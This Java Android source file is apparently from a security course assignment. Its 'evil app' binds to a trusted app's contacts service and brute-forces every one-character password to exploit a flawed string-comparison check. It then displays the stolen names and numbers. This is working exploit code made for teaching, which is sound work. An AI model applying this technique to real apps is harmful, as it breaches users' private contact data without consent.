package com.cs155.evilapp;

import com.cs155.trustedapp.IGetContactsString;

import android.os.Bundle;
import android.os.IBinder;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;


public class MainActivityNoKey extends Activity {

    private ListView lvShowContacts;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.btn_steal_contacts);
        final View tvLable = findViewById(R.id.tv_lable);
        lvShowContacts = (ListView) findViewById(R.id.lv_show_contact);

        OnClickListener listen = new OnClickListener() {
            public void onClick(View v) {
                /* The following line shows how to use the Log library. */
                Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");

                stealContacts();
                tvLable.setVisibility(View.VISIBLE);
            }
        };

        button.setOnClickListener(listen);
    }


    private void stealContacts() {
	    /* IPC call to the TrustedApp's ReadContactsService */
        this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
    }

    ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceDisconnected(ComponentName name) {
        }

        public void onServiceConnected(ComponentName name, IBinder ibinder) {

            try {
                /* Got a binding to the contacts service, cast it to IGetContactsString
                   to be able to call the GetContacts method on it */
                IGetContactsString service = IGetContactsString.Stub.asInterface((IBinder) ibinder);
    			
                /* Exploit the strcmp vulnerability in ReadContactsService (see README for 
                   detailed explanation of vulnerability): call the GetContacts method for
                   every one-character string as the candidate password, until one matches
                   the first character of the real password and we are granted access to 
                   the contacts */
                for (int c = Character.MIN_VALUE; c < Character.MAX_VALUE; c++) {

                    String password = Character.toString((char) c);
                    String contacts = service.GetContacts(password);

                    if (!contacts.equals("")) { /* Request succeeded, show contacts */
                        String[] contactNames = Utils.parseContactName(contacts);
                        String[] contactNumbersData = new String[contactNames.length];
                        final String[] contactNumbers = new String[contactNames.length];
                        if (contactNames != null) {
                            int index = 0;
                            for (String contactName : contactNames) {
                                StringBuffer info = new StringBuffer();
                                info.append("Name: ").append(contactName).append("\n");
                                String contactNumber = Utils.getPhoneNumber(MainActivityNoKey.this, contactName);
                                info.append("Number: ").append(contactNumber);

                                contactNumbers[index] = contactNumber;

                                //add information to list
                                contactNumbersData[index] = info.toString();
                                index++;
                            }
                        }

                        //put data to listview
                        ArrayAdapter adapter = new ArrayAdapter(MainActivityNoKey.this, android.R.layout.simple_list_item_1, contactNumbersData);
                        lvShowContacts.setAdapter(adapter);
                        lvShowContacts.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                            @Override
                            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                                String contactNumber = contactNumbers[position];
                                Intent intent = new Intent(MainActivityNoKey.this, ShowMessagesActivity.class);
                                intent.putExtra("contact", contactNumber);
                                startActivity(intent);
                            }
                        });
                    }
                }
            } catch (Exception e) {
                return;
            }

        }
    };
}
